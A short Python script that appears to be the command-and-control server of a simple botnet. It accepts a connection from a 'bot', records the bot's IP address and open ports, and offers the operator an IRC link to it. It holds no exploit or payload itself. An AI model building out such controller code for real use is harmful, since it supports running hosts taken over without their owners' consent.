import socket
from irc_client import irc_client_program

def get_host_info(conn):
    # get info on ip
    ip = conn.recv(1024).decode()
    if not ip:
        conn.send("RST".encode())
        return 0
    conn.send("ACK".encode())
    ip = ip[7:]

    # get info on open ports
    ss = conn.recv(1024).decode()
    if not ss:
        conn.send("RST".encode())
        return 0
    conn.send("ACK".encode())
    ss = ss[15:]

    return ip, ss

def server_program():
    # get the hostname
    host = "10.0.0.1"
    port = 4444  # initiate port no above 1024
    clients = 2

    bot_infos = {}

    server_socket = socket.socket()  # get instance
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # look closely. The bind() function takes tuple as argument
    server_socket.bind((host, port))  # bind host address and port together

    # configure how many client the server can listen simultaneously
    server_socket.listen(clients)
    print(f"server listening ({host}, {port})")

    conn, address = server_socket.accept()  # accept new connection
    print("Connection from: " + str(address))
    
    host_ip, host_ports = get_host_info(conn)
    bot_infos[str(address)] = (host_ip, host_ports)
    print(f"Got info about {str(address)}: \nip: \n\t{host_ip} \nopen ports: \n\t{host_ports}")
    
    while True:
        action = input("Connect to bot using IRC ('irc'), exit ('exit'): ")
        if action.lower() == "irc":
            irc_client_program()
        elif action == 'exit':
            break
    # while True:
    #     # receive data stream. it won't accept data packet greater than 1024 bytes
    #     data = conn.recv(1024).decode()
    #     if not data:
    #         # if data is not received break
    #         break
    #     print("from connected user: " + str(data))
    #     data = input(' -> ')
    #     conn.send(data.encode())  # send data to the client

    conn.close()  # close the connection


if __name__ == '__main__':
    server_program()